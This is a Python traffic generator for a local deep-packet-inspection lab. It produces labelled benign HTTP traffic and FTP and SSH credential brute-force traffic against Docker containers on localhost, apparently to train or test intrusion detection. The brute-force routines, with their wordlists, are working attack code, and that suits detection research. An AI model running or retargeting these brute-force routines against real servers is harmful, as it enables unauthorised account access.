#!/usr/bin/env python3
"""
KGEC DPI Lab — Controlled Traffic Generator
============================================
Generates labelled attack and benign traffic against the local Docker lab.
Run ONLY against the loopback / Docker bridge network (172.30.0.0/24).

Usage:
    python lab/traffic_generator.py --mode benign   --duration 60
    python lab/traffic_generator.py --mode ftp      --duration 30
    python lab/traffic_generator.py --mode ssh      --duration 30
    python lab/traffic_generator.py --mode mixed    --duration 120

Requirements:
    pip install paramiko ftplib requests colorama
"""

import argparse
import ftplib
import itertools
import random
import socket
import sys
import threading
import time
import urllib.request
from datetime import datetime

# ─── Colour helpers ───────────────────────────────────────────────────────────
try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init()
    RED    = Fore.RED
    GRN    = Fore.GREEN
    YLW    = Fore.YELLOW
    CYN    = Fore.CYAN
    RST    = Style.RESET_ALL
except ImportError:
    RED = GRN = YLW = CYN = RST = ""

# ─── Lab target config (Docker bridge IPs / host-mapped ports) ────────────────
LAB_FTP_HOST = "127.0.0.1"
LAB_FTP_PORT = 2121          # mapped from kgec-vuln-ftp:21

LAB_SSH_HOST = "127.0.0.1"
LAB_SSH_PORT = 2222          # mapped from kgec-vuln-ssh:2222

LAB_HTTP_HOST = "127.0.0.1"
LAB_HTTP_PORT = 8080         # DVWA

# ─── Wordlists — intentionally simple for lab use ────────────────────────────
USERNAMES = ["admin", "root", "labuser", "ftpuser", "guest", "test", "ubuntu"]
PASSWORDS = ["password", "123456", "admin", "root", "pass", "letmein",
             "welcome", "qwerty", "abc123", "monkey", "dragon"]

# ─── Logging ─────────────────────────────────────────────────────────────────

def log(label: str, msg: str, color: str = "") -> None:
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    print(f"{color}[{ts}] [{label}] {msg}{RST}")

# ═══════════════════════════════════════════════════════════════════════════════
# BENIGN TRAFFIC — normal HTTP browsing, DNS, benign TCP connections
# ═══════════════════════════════════════════════════════════════════════════════

def generate_benign(stop_event: threading.Event, duration: float) -> None:
    """Simulate benign HTTP + TCP flows to the lab DVWA app."""
    benign_paths = ["/", "/login.php", "/index.php",
                    "/dvwa/index.php", "/favicon.ico"]
    deadline = time.time() + duration
    count = 0
    while not stop_event.is_set() and time.time() < deadline:
        path = random.choice(benign_paths)
        try:
            url = f"http://{LAB_HTTP_HOST}:{LAB_HTTP_PORT}{path}"
            with urllib.request.urlopen(url, timeout=3) as resp:
                _ = resp.read(512)
            count += 1
            log("BENIGN", f"GET {path} → HTTP {resp.status}", GRN)
        except Exception as e:
            log("BENIGN", f"GET {path} → {e}", GRN)
        time.sleep(random.uniform(0.5, 2.0))
    log("BENIGN", f"Done — {count} benign requests generated", GRN)

# ═══════════════════════════════════════════════════════════════════════════════
# FTP BRUTEFORCE — tries credential pairs against vuln-ftp
# ═══════════════════════════════════════════════════════════════════════════════

def ftp_bruteforce_worker(pairs, stop_event: threading.Event, stats: dict) -> None:
    for user, passwd in pairs:
        if stop_event.is_set():
            break
        try:
            ftp = ftplib.FTP()
            ftp.connect(LAB_FTP_HOST, LAB_FTP_PORT, timeout=4)
            ftp.login(user, passwd)
            ftp.quit()
            stats["success"] += 1
            log("FTP-BRUTE", f"✓ VALID   {user}:{passwd}", YLW)
        except ftplib.error_perm:
            stats["fail"] += 1
            log("FTP-BRUTE", f"✗ REJECT  {user}:{passwd}", RED)
        except Exception as e:
            stats["error"] += 1
            log("FTP-BRUTE", f"! ERR     {user}:{passwd} — {e}", RED)
        time.sleep(random.uniform(0.05, 0.2))


def generate_ftp_bruteforce(stop_event: threading.Event, duration: float) -> None:
    """Multi-threaded FTP credential bruteforce — generates FTP-BruteForce flows."""
    pairs = list(itertools.product(USERNAMES, PASSWORDS))
    # Cycle the list to fill the full duration
    pairs = pairs * max(1, int(duration / max(len(pairs) * 0.15, 1)) + 1)
    random.shuffle(pairs)

    stats = {"success": 0, "fail": 0, "error": 0}

    # Cap duration via stop event
    threading.Timer(duration, stop_event.set).start()

    chunk = max(1, len(pairs) // 4)
    threads = []
    for i in range(0, min(len(pairs), 4)):  # 4 concurrent threads
        t = threading.Thread(
            target=ftp_bruteforce_worker,
            args=(pairs[i * chunk:(i + 1) * chunk], stop_event, stats),
            daemon=True
        )
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    log("FTP-BRUTE", (
        f"Complete — ✓ {stats['success']} valid  "
        f"✗ {stats['fail']} rejected  "
        f"! {stats['error']} errors"
    ), YLW)

# ═══════════════════════════════════════════════════════════════════════════════
# SSH BRUTEFORCE — requires paramiko
# ═══════════════════════════════════════════════════════════════════════════════

def generate_ssh_bruteforce(stop_event: threading.Event, duration: float) -> None:
    """SSH credential spray — generates SSH-Bruteforce flows."""
    try:
        import paramiko
    except ImportError:
        log("SSH-BRUTE", "paramiko not installed. Run: pip install paramiko", RED)
        return

    pairs = list(itertools.product(USERNAMES, PASSWORDS))
    pairs = pairs * max(1, int(duration / max(len(pairs) * 0.3, 1)) + 1)
    random.shuffle(pairs)

    deadline = time.time() + duration
    success = fail = error = 0

    for user, passwd in pairs:
        if stop_event.is_set() or time.time() > deadline:
            break
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(
                LAB_SSH_HOST, port=LAB_SSH_PORT,
                username=user, password=passwd,
                timeout=4, banner_timeout=4,
                auth_timeout=4, look_for_keys=False,
                allow_agent=False
            )
            ssh.close()
            success += 1
            log("SSH-BRUTE", f"✓ VALID   {user}:{passwd}", YLW)
        except paramiko.AuthenticationException:
            fail += 1
            log("SSH-BRUTE", f"✗ REJECT  {user}:{passwd}", RED)
        except Exception as e:
            error += 1
            log("SSH-BRUTE", f"! ERR     {user}:{passwd} — {e}", RED)
        finally:
            ssh.close()
        time.sleep(random.uniform(0.1, 0.4))

    log("SSH-BRUTE", (
        f"Complete — ✓ {success} valid  "
        f"✗ {fail} rejected  "
        f"! {error} errors"
    ), YLW)

# ═══════════════════════════════════════════════════════════════════════════════
# MIXED MODE — interleave all traffic types randomly
# ═══════════════════════════════════════════════════════════════════════════════

def generate_mixed(stop_event: threading.Event, duration: float) -> None:
    """Interleave benign + FTP + SSH traffic (most realistic for ML testing)."""
    log("MIXED", f"Starting mixed traffic for {duration}s", CYN)

    stop_ftp  = threading.Event()
    stop_ssh  = threading.Event()
    stop_http = threading.Event()

    def stop_all():
        stop_ftp.set(); stop_ssh.set(); stop_http.set(); stop_event.set()

    threading.Timer(duration, stop_all).start()

    threads = [
        threading.Thread(target=generate_benign,        args=(stop_http, duration), daemon=True),
        threading.Thread(target=generate_ftp_bruteforce, args=(stop_ftp,  duration), daemon=True),
        threading.Thread(target=generate_ssh_bruteforce, args=(stop_ssh,  duration), daemon=True),
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    log("MIXED", "All traffic generators finished.", CYN)

# ═══════════════════════════════════════════════════════════════════════════════
# CLI entrypoint
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="KGEC DPI Lab Traffic Generator — legal lab use only"
    )
    parser.add_argument(
        "--mode", choices=["benign", "ftp", "ssh", "mixed"],
        default="mixed", help="Traffic mode (default: mixed)"
    )
    parser.add_argument(
        "--duration", type=float, default=60,
        help="Duration in seconds (default: 60)"
    )
    args = parser.parse_args()

    print(f"\n{CYN}{'═'*60}")
    print(f"  KGEC DPI Lab — Traffic Generator")
    print(f"  Mode: {args.mode.upper()}  │  Duration: {args.duration}s")
    print(f"  FTP  → {LAB_FTP_HOST}:{LAB_FTP_PORT}")
    print(f"  SSH  → {LAB_SSH_HOST}:{LAB_SSH_PORT}")
    print(f"  HTTP → http://{LAB_HTTP_HOST}:{LAB_HTTP_PORT}")
    print(f"{'═'*60}{RST}\n")

    stop = threading.Event()
    if   args.mode == "benign": generate_benign(stop, args.duration)
    elif args.mode == "ftp":    generate_ftp_bruteforce(stop, args.duration)
    elif args.mode == "ssh":    generate_ssh_bruteforce(stop, args.duration)
    elif args.mode == "mixed":  generate_mixed(stop, args.duration)

if __name__ == "__main__":
    main()
